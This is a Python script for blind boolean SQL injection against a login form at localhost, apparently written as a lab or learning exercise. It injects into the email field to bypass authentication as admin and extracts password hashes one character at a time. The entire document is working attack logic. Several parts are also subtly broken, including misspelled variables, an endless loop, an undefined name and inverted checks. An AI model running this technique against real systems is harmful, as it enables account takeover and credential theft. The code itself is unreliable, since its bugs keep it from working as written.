import requests

total_queries = 0
charset       = "0123456789abcdef"
target        = "http://localhost:5000"
needle        = "Welcome back"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"email": "admin ' and {} --".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offeset, user_id, character, operator='>'):
    payload="(select hex(substr(password, {}, 1)) from user where id = {}) {} hex ('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def is_valid_user(user_id):
    payload="(select id from user where = {} >= 0)".format(user_id)
    return injected_query(payload)

def pass_hash_length(user_id):
    guess = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, guess)
        if not injected_query(payload):
            return guess
    guess += 1

def optimized_extract_hash(charset, user_id, length_password):
    found = ""
    for i in range(pass_hash_length):
        start = 0
        end   = len(charset) - 1
        while start <= end: #while we still have middle
            if end - start == 1:
                if start == 0 and boolean_query(i, user_id, charset[start]):
                    found += charset[i]
                else:
                    found += charset[i+1]
                break
            else:
                middle = (start + end) // 2
                if boolean_query(i, user_id, charset[middle]):
                    end   = middle
                else:
                    start = middle
    return found   



def total_queries_performed():
    global total_queries
    print("\t\t[!] {} total queries !".format(total_queries))
    total_queries = 0

while True:
    try:
        user_id = input("> Enter user id:")
        if not is_valid_user(user_id):
            hash_length = pass_hash_length(user_id)
            print("\t[-] user: {} hash length: {}\n".format(user_id, hash_length))
            total_queries_performed()
            print("\t[-] user: {} hash: {}".format(user, optimized_extract_hash(charset, int(user_id), hash_length)))
        else:
            print("\t[X] user dosn't exsit.")
    except KeyboardInterrupt:
        print("exisitng the task succesfully")
        break





    
